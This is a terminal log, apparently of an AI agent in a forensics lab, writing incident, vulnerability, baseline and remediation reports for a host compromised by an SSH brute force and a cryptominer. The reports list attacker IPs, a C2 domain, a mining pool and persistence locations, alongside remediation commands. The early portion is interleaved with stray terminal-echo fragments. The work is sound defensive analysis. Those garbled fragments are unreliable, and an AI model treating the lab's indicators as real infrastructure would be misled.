+[?2004l0[?2004h> Initial access was achieved purely through **credential exploitation** (SSH root password brute forcing) rather than software vulnerability exploitation:
+[?2004l[?2004h> - Source IP `198.51.100.78` performed rapid password attempts against port 22 (`/disk/var/log/secure:141`).
+[?2004l[?2004h> - Successful root login occurred at 2026-08-15 00:54:55 UTC via `Accepted password for root` (`/disk/var/log/secure:178`).
+[?2004l[?2004h> - Threat intelligence advisory confirms the campaign relies on brute-force SSH logins (`/sas/cti/advisory.txt`).
+[?2004l. |
+| 4 | [?2004h> 
+[?2004l[?2004h> ## Conclusion
+[?2004lmove shell-in[?2004h> - **Software Vulnerability Exploited for Entry:** NONE (0 CVEs).
+[?2004la[?2004h> - **Primary Root Cause:** Weak root password and non-hardened SSH service configurations.
+[?2004l[?2004h> - **Confidence Level:** HIGH (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`, `/sas/vulns.json`).
+[?2004l[?2004h> '''
+[?2004l[?2004h> 
+[?2004l[?2004h> baseline_report = '''# Security Baseline and Configuration Analysis Report
+[?2004le[?2004h> 
+[?2004lr[?2004h> ## Executive Summary
+[?2004l[?2004h> Analysis of system configurations on `ssh-prod-01` revealed several severe security baseline deficiencies that directly facilitated the initial breach, enabled privilege escalation, and increased the host's overall attack surface.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Baseline Findings & Weaknesses
+[?2004lin[?2004h> 
+[?2004l[?2004h> ### 1. Insecure SSH Configuration (BAS-01 / CHK-04)
+[?2004lrg`). |
+| 8 [?2004h> - **Artifact Path:** `/etc/ssh/sshd_config` (`/disk/etc/ssh/sshd_config`, `/sas/baseline.json`)
+[?2004l[?2004h> - **Identified Weaknesses:**
+[?2004l[?2004h>   - `PermitRootLogin yes`: Allows direct SSH logins as `root` from remote external hosts (`/disk/etc/ssh/sshd_config`).
+[?2004l[?2004h>   - `PasswordAuthentication yes`: Permits password authentication instead of requiring SSH key-based authentication (`/disk/etc/ssh/sshd_config`).
+[?2004lDE[?2004h>   - `MaxAuthTries 6`: High authentication attempt threshold before disconnection, enabling rapid dictionary brute-forcing (`/disk/etc/ssh/sshd_config`).
+[?2004l[?2004h> - **Security Risk:** Allowed the external attacker at `198.51.100.78` to brute-force the root user password directly over the network (`/disk/var/log/secure:178`).
+[?2004l[?2004h> 
+[?2004le[?2004h> ### 2. MySQL Remote Root Access and Public Binding (BAS-02 / CHK-09)
+[?2004ldisk[?2004h> - **Artifact Path:** `/etc/my.cnf` (`/disk/etc/my.cnf`, `/sas/baseline.json`)
+[?2004l[?2004h> - **Identified Weaknesses:**
+[?2004lp 198.51.[?2004h>   - `bind-address = 0.0.0.0`: Binds MySQL database service to all network interfaces (`/disk/etc/my.cnf`).
+[?2004l[?2004h>   - Remote root grant enabled: Grants root database privileges over remote network connections (`/disk/etc/my.cnf`).
+[?2004lEvidence Ci[?2004h> - **Security Risk:** Exposes sensitive database management interface directly to the public/untrusted network.
+[?2004le
+  kill -9 1337
+  m[?2004h> 
+[?2004lv[?2004h> ### 3. Weak Root Account Password Policy
+[?2004l[?2004h> - **Artifact Path:** System authentication logs (`/disk/var/log/secure:178`)
+[?2004l*[?2004h> - **Identified Weaknesses:** Root account was secured by a weak password easily guessable via standard dictionary attack tools (`hydra`).
+[?2004l[?2004h> - **Security Risk:** Enabled root account takeover within minutes of attack onset (`/disk/var/log/secure:141-178`).
+[?2004laining the malicious beacon.
+[?2004h> 
+[?2004l[?2004h> ### 4. Excessive Privilege Delegation in Sudoers (Silent Backdoor Risk)
+[?2004l*
+[?2004h> - **Artifact Path:** `/etc/sudoers.d/devops` (`/disk/etc/sudoers.d/devops:3`)
+[?2004l[?2004h> - **Identified Weaknesses:** Drop-in sudoers entry `devops ALL=(ALL) NOPASSWD: ALL` grants unrestricted root access without password prompt (`/disk/etc/sudoers.d/devops:3`).
+[?2004listence
+- **Ac[?2004h> - **Security Risk:** Created a persistent backdoor allowing user `devops` to elevate to root seamlessly (`/disk/etc/sudoers.d/devops:3`).
+[?2004l[?2004h> '''
+[?2004l[?2004h> 
+[?2004lm[?2004h> remediation_plan = '''# Comprehensive Post-Incident Remediation & Containment Plan
+[?2004lctl stop[?2004h> 
+[?2004l [?2004h> ## Executive Summary
+[?2004l[?2004h> This remediation plan outlines prioritized, step-by-step procedures to contain the active breach on `ssh-prod-01`, eradicate all persistence mechanisms, harden host baselines, and reconcile the draft change ticket CHG-3182. In accordance with forensic best practices, all actions prioritize backup and quarantine over destructive deletion.
+[?2004l[?2004h> 
+[?2004lo[?2004h> ---
+[?2004l[?2004h> 
+[?2004le `P[?2004h> ## Reconciled Change Ticket CHG-3182
+[?2004l**[?2004h> 
+[?2004lE[?2004h> Below is the updated and corrected change ticket reconciled against forensic evidence in `/disk` and `/sas`:
+[?2004l[?2004h> 
+[?2004l[?2004h> | # | Action | Target | Status | Note / Rationale & Evidence |
+[?2004l[?2004h> |---|--------|--------|--------|-----------------------------|
+[?2004l
+
+##[?2004h> | 1 | Block source IP inbound | `198.51.100.78` | PROPOSED | **RECONCILED**: Corrected attacker IP from stale `203.0.113.9` to `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`). |
+[?2004l[?2004h> | 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | REJECTED | **RECONCILED**: Rejected BlueKeep patch claim. Host is CentOS Linux; entry was SSH brute force (`/disk/etc/os-release`, `/sas/cti/advisory.txt`). |
+[?2004l[?2004h> | 3 | Remove cron miner | `/var/spool/cron/root` | OPEN | **RECONCILED**: Downgraded from DONE to OPEN. Cron persistent beacon on line 5 requires quarantine and removal (`/disk/var/spool/cron/root:5`). |
+[?2004l[?2004h> | 4 | Remove shell-init persistence | `/root/.bashrc` | TODO | **ADDED**: Quarantine and remove `PROMPT_COMMAND` beacon on line 2 (`/disk/root/.bashrc:2`). |
+[?2004l sed -i 's/^[?2004h> | 5 | Remove systemd persistence | `/etc/systemd/system/system-update-helper.service` | TODO | **ADDED**: Disable, stop, and quarantine helper service (`/disk/etc/systemd/system/system-update-helper.service`). |
+[?2004l[?2004h> | 6 | Remove sudoers backdoor | `/etc/sudoers.d/devops` | TODO | **ADDED**: Remove NOPASSWD ALL backdoor entry (`/disk/etc/sudoers.d/devops:3`). |
+[?2004l|maxauthtries"`  
+
+### Step 3.[?2004h> | 7 | Kill miner process & quarantine binary | `/tmp/.X11-unix/.xorg` | TODO | **ADDED**: Terminate process PID 1337 and quarantine binary sample (`/disk/tmp/.X11-unix/.xorg`). |
+[?2004l[?2004h> | 8 | Harden SSH configuration | `/etc/ssh/sshd_config` | TODO | **ADDED**: Set `PermitRootLogin no`, `PasswordAuthentication no`, require keys (`/disk/etc/ssh/sshd_config`). |
+[?2004l[?2004h> | 9 | Harden MySQL configuration | `/etc/my.cnf` | TODO | **ADDED**: Set `bind-address = 127.0.0.1` and disable remote root (`/disk/etc/my.cnf`). |
+[?2004l[?2004h> | 10 | Rotate root & user credentials | System Accounts | TODO | **ADDED**: Force password rotation across root and user accounts (`/disk/etc/passwd`). |
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l:[?2004h> ## Phase 1: Immediate Network Containment & Process Termination
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1.1: Block Attacker Infrastructure at Perimeter Firewall
+[?2004l[?2004h> - **Action:** Add drop rules for attacker origin IP `198.51.100.78`, C2 domain `update-ssh.example.cn`, and pool domain `xmr.ssh.evil`.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/var/log/secure:178`, `/sas/cti/advisory.txt`
+[?2004l[?2004h> - **Verification Command:** `iptables -L -n -v | grep 198.51.100.78`  
+[?2004l[?2004h> 
+[?2004lv[?2004h> ### Step 1.2: Terminate Mining Process & Quarantine Binary
+[?2004l[?2004h> - **Action:** Terminate active miner process (PID 1337) and move binary `/tmp/.X11-unix/.xorg` to quarantine directory `/var/quarantine/`.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/tmp/.X11-unix/.xorg`  
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l [?2004h>   mkdir -p /var/quarantine
+[?2004le_[?2004h>   kill -9 1337
+[?2004l
+with o[?2004h>   mv /tmp/.X11-unix/.xorg /var/quarantine/.xorg.bak
+[?2004l[?2004h>   chmod 000 /var/quarantine/.xorg.bak
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification Command:** `ps aux | grep .xorg`  
+[?2004ln[?2004h> 
+[?2004l_[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Phase 2: Eradication of Persistence Mechanisms
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2.1: Eradicate Cron Persistence
+[?2004l[?2004h> - **Action:** Backup `/var/spool/cron/root` to `/var/quarantine/cron_root.bak` and remove line 5 containing the malicious beacon.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/var/spool/cron/root:5`  
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /var/spool/cron/root /var/quarantine/cron_root.bak
+[?2004l[?2004h>   sed -i '/198.51.100.78/d' /var/spool/cron/root
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification Command:** `crontab -l -u root | grep 198.51.100.78`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2.2: Eradicate Systemd Service Persistence
+[?2004l[?2004h> - **Action:** Stop, disable, and relocate service file `/etc/systemd/system/system-update-helper.service`.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/systemd/system/system-update-helper.service`  
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   systemctl stop system-update-helper.service
+[?2004l[?2004h>   systemctl disable system-update-helper.service
+[?2004l[?2004h>   mv /etc/systemd/system/system-update-helper.service /var/quarantine/
+[?2004l[?2004h>   systemctl daemon-reload
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification Command:** `systemctl status system-update-helper.service`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2.3: Eradicate Shell-Init Persistence (.bashrc)
+[?2004l[?2004h> - **Action:** Backup `/root/.bashrc` and remove `PROMPT_COMMAND` beacon on line 2.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/root/.bashrc:2`  
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /root/.bashrc /var/quarantine/.bashrc.bak
+[?2004l[?2004h>   sed -i '/PROMPT_COMMAND/d' /root/.bashrc
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification Command:** `grep PROMPT_COMMAND /root/.bashrc`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2.4: Eradicate Sudoers Backdoor
+[?2004l[?2004h> - **Action:** Backup and remove `/etc/sudoers.d/devops`.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/sudoers.d/devops:3`  
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   mv /etc/sudoers.d/devops /var/quarantine/devops_sudoers.bak
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification Command:** `sudo -l -U devops`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Phase 3: System Hardening & Baseline Remediation
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 3.1: Harden SSH Baseline
+[?2004l[?2004h> - **Action:** Update `/etc/ssh/sshd_config` to disallow root password logins and enforce SSH key authentication.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/ssh/sshd_config`  
+[?2004l[?2004h> - **Configuration Updates:**
+[?2004l[?2004h>   ```ini
+[?2004l[?2004h>   PermitRootLogin no
+[?2004l[?2004h>   PasswordAuthentication no
+[?2004l[?2004h>   MaxAuthTries 3
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /etc/ssh/sshd_config /var/quarantine/sshd_config.bak
+[?2004l[?2004h>   sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
+[?2004l[?2004h>   sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
+[?2004l[?2004h>   sed -i 's/^MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config
+[?2004l[?2004h>   systemctl reload sshd
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification Command:** `sshd -T | grep -E "permitrootlogin|passwordauthentication|maxauthtries"`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 3.2: Harden MySQL Baseline
+[?2004l[?2004h> - **Action:** Restrict MySQL binding to local interface in `/etc/my.cnf` and revoke remote root grants.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/my.cnf`  
+[?2004l[?2004h> - **Configuration Updates:**
+[?2004l[?2004h>   ```ini
+[?2004l[?2004h>   bind-address = 127.0.0.1
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /etc/my.cnf /var/quarantine/my.cnf.bak
+[?2004l[?2004h>   sed -i 's/bind-address = 0.0.0.0/bind-address = 127.0.0.1/' /etc/my.cnf
+[?2004l[?2004h>   systemctl restart mysqld
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification Command:** `netstat -tuln | grep 3306`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 3.3: Rotate All Credentials
+[?2004l[?2004h> - **Action:** Force immediate password change for root and all user accounts.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/passwd`, `/disk/var/log/secure:178`  
+[?2004l[?2004h> - **Commands:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   passwd -l root
+[?2004l[?2004h>   passwd devops
+[?2004l[?2004h>   ```
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Phase 4: Internal Target Investigation & Monitoring
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 4.1: Internal Network Pivoting Scope Assessment
+[?2004l[?2004h> - **Action:** Inspect internal hosts reachable from `ssh-prod-01` for potential hydra brute-force attempts originated by `devops`.
+[?2004l[?2004h> - **Evidence Citation:** `/disk/home/devops/.bash_history:6`  
+[?2004l[?2004h> - **Verification Command:** Review network connection logs and authentication logs across internal subnet nodes.
+[?2004l[?2004h> '''
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/intrusion-report.md', 'w') as f:
+[?2004l[?2004h>     f.write(intrusion_report)
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/vuln-report.md', 'w') as f:
+[?2004l[?2004h>     f.write(vuln_report)
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/baseline-report.md', 'w') as f:
+[?2004l[?2004h>     f.write(baseline_report)
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/remediation-plan.md', 'w') as f:
+[?2004l[?2004h>     f.write(remediation_plan)
+[?2004l[?2004h> 
+[?2004l[?2004h> print("All 4 additional files written successfully!")
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@58bb37a3cf48:/app# python3 /app/gen_all.py
+[?2004lAll 4 additional files written successfully!
+[?2004hroot@58bb37a3cf48:/app# ls -la /app
+[?2004ltotal 60
+drwxr-xr-x 1 root root  4096 Aug 16 14:58 [0m[01;34m.[0m
+drwxr-xr-x 1 root root  4096 Aug 16 14:54 [01;34m..[0m
+-rw-r--r-- 1 root root  2452 Aug 16 14:58 baseline-report.md
+-rw-r--r-- 1 root root 17333 Aug 16 14:58 gen_all.py
+-rw-r--r-- 1 root root  5292 Aug 16 14:58 intrusion-report.md
+-rw-r--r-- 1 root root  3047 Aug 16 14:57 make_files.py
+-rw-r--r-- 1 root root  2925 Aug 16 14:57 progress.md
+-rw-r--r-- 1 root root  7085 Aug 16 14:58 remediation-plan.md
+-rw-r--r-- 1 root root  2029 Aug 16 14:58 vuln-report.md
+[?2004hroot@58bb37a3cf48:/app# head -n 20 /app/progress.md /app/intrusion-report.md /app/vuln-report.md /app/baseline-report.md /app/remediation-plan.md
+[?2004l==> /app/progress.md <==
+# Forensic Investigation Progress & Checklist
+
+## Incident Overview
+- Host: ssh-prod-01 (CentOS 7 Linux)
+- Primary Incident Type: SSH Root Brute Force, Monero Cryptomining, Multi-stage Persistence, Anti-Forensics (Log Wiping)
+- Status: Investigation & Remediation Planning Complete
+
+## Timeline of Events (UTC)
+1. 2026-08-15 00:53:24 - 00:54:52: External SSH brute-force attack against root user initiated from attacker origin IP `/disk/var/log/secure:141`.
+2. 2026-08-15 00:54:55: Attacker successfully authenticates as root via SSH password brute force `/disk/var/log/secure:178`.
+3. 2026-08-15 00:55 - 01:29: Attacker conducts post-exploitation activity:
+   - Dropped and executed Monero cryptominer binary at `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`).
+   - Installed cron persistence in `/var/spool/cron/root` (`/disk/var/spool/cron/root:5`, `/sas/alerts.json`).
+   - Installed shell-init persistence in `/root/.bashrc` (`/disk/root/.bashrc:2`).
+   - Installed systemd service persistence at `/etc/systemd/system/system-update-helper.service` (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`).
+   - Planted NOPASSWD sudo backdoor in `/etc/sudoers.d/devops` (`/disk/etc/sudoers.d/devops:3`).
+   - Cleared authentication logs causing log gap between 00:54:55 and 01:29:12 (`/disk/var/lib/.cache/.wiped.bin`, `/disk/var/log/secure:178`).
+   - Executed hydra brute-force tool against internal targets from devops user account context (`/disk/home/devops/.bash_history:6`).
+4. 2026-08-15 03:20: Incident detected and intake logged by SOC (`/sas/handoff/intake.pdf`).
+
+
+==> /app/intrusion-report.md <==
+# Post-Compromise Forensic Intrusion Report
+
+## Executive Summary
+Host `ssh-prod-01` (CentOS 7 Linux) suffered a multi-stage compromise initiated via external SSH root credential brute-forcing. The attacker successfully authenticated as `root`, deployed an XMRig Monero cryptominer, established multi-layered persistence across four distinct mechanisms (cron, systemd service, shell init, and a sudoers backdoor), cleared system authentication logs to evade detection, and conducted internal reconnaissance/pivoting via `hydra` against internal targets.
+
+## Attacker Entities and Indicators of Compromise (IoCs)
+- **Origin Attacker IP:** `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`)
+- **C2 Beacon Domain:** `update-ssh.example.cn` (`/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`)
+- **Cryptomining Pool:** `stratum+tcp://xmr.ssh.evil:3333` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)
+- **Monero Wallet Address:** `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)
+- **Malware Process PID:** `1337` (`/disk/tmp/.X11-unix/.xorg`)
+- **Malware Binary Location:** `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`)
+- **Malware Binary SHA256 Hash:** `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253` (`/disk/tmp/.X11-unix/.xorg`)
+
+## Comprehensive Attack Chain Analysis
+
+### 1. Initial Access & Credential Access
+The attacker initiated a high-frequency SSH password brute-force campaign against host `ssh-prod-01` targeting common accounts (`oracle`, `test`, `admin`, `postgres`, `root`) from source IP `198.51.100.78` (`/disk/var/log/secure:141`). At 2026-08-15 00:54:55 UTC, the attacker successfully authenticated as user `root` due to weak root credentials and permissive SSH baseline configurations (`/disk/var/log/secure:178`, `/disk/etc/ssh/sshd_config`).
+
+### 2. Execution & Impact (Cryptomining)
+
+==> /app/vuln-report.md <==
+# Vulnerability-Driven Entry Analysis Report
+
+## Executive Summary
+A comprehensive analysis of vulnerability scan data (`/sas/vulns.json`), threat intelligence advisories (`/sas/cti/advisory.txt`), and forensic disk artifacts (`/disk`) was conducted to evaluate whether software vulnerabilities (CVEs) played any role in the initial compromise of `ssh-prod-01`.
+
+## Evaluation of Vulnerability Scan Results
+The machine-readable vulnerability scan feed `/sas/vulns.json` contains an empty list (`[]`), indicating that no unpatched software vulnerabilities or active CVE exploits were identified or reported on host `ssh-prod-01` (`/sas/vulns.json`).
+
+## Evaluation of Draft Change Ticket Claims (BlueKeep CVE-2019-0708)
+The initial draft change ticket CHG-3182 proposed patching `CVE-2019-0708` (BlueKeep) on RDP (`/sas/handoff/change-ticket.md`). 
+
+This proposal is **FALSE and INCORRECT**:
+1. Host `ssh-prod-01` is running CentOS 7 Linux (`/disk/etc/os-release`), whereas BlueKeep (CVE-2019-0708) is a Remote Desktop Protocol (RDP) vulnerability specific to Microsoft Windows operating systems (`/sas/cti/advisory.txt`).
+2. No RDP service or Windows subsystem exists on this Linux host (`/disk/etc/os-release`).
+
+## True Initial Entry Vector Identification
+Initial access was achieved purely through **credential exploitation** (SSH root password brute forcing) rather than software vulnerability exploitation:
+- Source IP `198.51.100.78` performed rapid password attempts against port 22 (`/disk/var/log/secure:141`).
+- Successful root login occurred at 2026-08-15 00:54:55 UTC via `Accepted password for root` (`/disk/var/log/secure:178`).
+- Threat intelligence advisory confirms the campaign relies on brute-force SSH logins (`/sas/cti/advisory.txt`).
+
+==> /app/baseline-report.md <==
+# Security Baseline and Configuration Analysis Report
+
+## Executive Summary
+Analysis of system configurations on `ssh-prod-01` revealed several severe security baseline deficiencies that directly facilitated the initial breach, enabled privilege escalation, and increased the host's overall attack surface.
+
+## Baseline Findings & Weaknesses
+
+### 1. Insecure SSH Configuration (BAS-01 / CHK-04)
+- **Artifact Path:** `/etc/ssh/sshd_config` (`/disk/etc/ssh/sshd_config`, `/sas/baseline.json`)
+- **Identified Weaknesses:**
+  - `PermitRootLogin yes`: Allows direct SSH logins as `root` from remote external hosts (`/disk/etc/ssh/sshd_config`).
+  - `PasswordAuthentication yes`: Permits password authentication instead of requiring SSH key-based authentication (`/disk/etc/ssh/sshd_config`).
+  - `MaxAuthTries 6`: High authentication attempt threshold before disconnection, enabling rapid dictionary brute-forcing (`/disk/etc/ssh/sshd_config`).
+- **Security Risk:** Allowed the external attacker at `198.51.100.78` to brute-force the root user password directly over the network (`/disk/var/log/secure:178`).
+
+### 2. MySQL Remote Root Access and Public Binding (BAS-02 / CHK-09)
+- **Artifact Path:** `/etc/my.cnf` (`/disk/etc/my.cnf`, `/sas/baseline.json`)
+- **Identified Weaknesses:**
+  - `bind-address = 0.0.0.0`: Binds MySQL database service to all network interfaces (`/disk/etc/my.cnf`).
+  - Remote root grant enabled: Grants root database privileges over remote network connections (`/disk/etc/my.cnf`).
+
+==> /app/remediation-plan.md <==
+# Comprehensive Post-Incident Remediation & Containment Plan
+
+## Executive Summary
+This remediation plan outlines prioritized, step-by-step procedures to contain the active breach on `ssh-prod-01`, eradicate all persistence mechanisms, harden host baselines, and reconcile the draft change ticket CHG-3182. In accordance with forensic best practices, all actions prioritize backup and quarantine over destructive deletion.
+
+---
+
+## Reconciled Change Ticket CHG-3182
+
+Below is the updated and corrected change ticket reconciled against forensic evidence in `/disk` and `/sas`:
+
+| # | Action | Target | Status | Note / Rationale & Evidence |
+|---|--------|--------|--------|-----------------------------|
+| 1 | Block source IP inbound | `198.51.100.78` | PROPOSED | **RECONCILED**: Corrected attacker IP from stale `203.0.113.9` to `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`). |
+| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | REJECTED | **RECONCILED**: Rejected BlueKeep patch claim. Host is CentOS Linux; entry was SSH brute force (`/disk/etc/os-release`, `/sas/cti/advisory.txt`). |
+| 3 | Remove cron miner | `/var/spool/cron/root` | OPEN | **RECONCILED**: Downgraded from DONE to OPEN. Cron persistent beacon on line 5 requires quarantine and removal (`/disk/var/spool/cron/root:5`). |
+| 4 | Remove shell-init persistence | `/root/.bashrc` | TODO | **ADDED**: Quarantine and remove `PROMPT_COMMAND` beacon on line 2 (`/disk/root/.bashrc:2`). |
+| 5 | Remove systemd persistence | `/etc/systemd/system/system-update-helper.service` | TODO | **ADDED**: Disable, stop, and quarantine helper service (`/disk/etc/systemd/system/system-update-helper.service`). |
+| 6 | Remove sudoers backdoor | `/etc/sudoers.d/devops` | TODO | **ADDED**: Remove NOPASSWD ALL backdoor entry (`/disk/etc/sudoers.d/devops:3`). |
+| 7 | Kill miner process & quarantine binary | `/tmp/.X11-unix/.xorg` | TODO | **ADDED**: Terminate process PID 1337 and quarantine binary sample (`/disk/tmp/.X11-unix/.xorg`). |
+[?2004hroot@58bb37a3cf48:/app# 
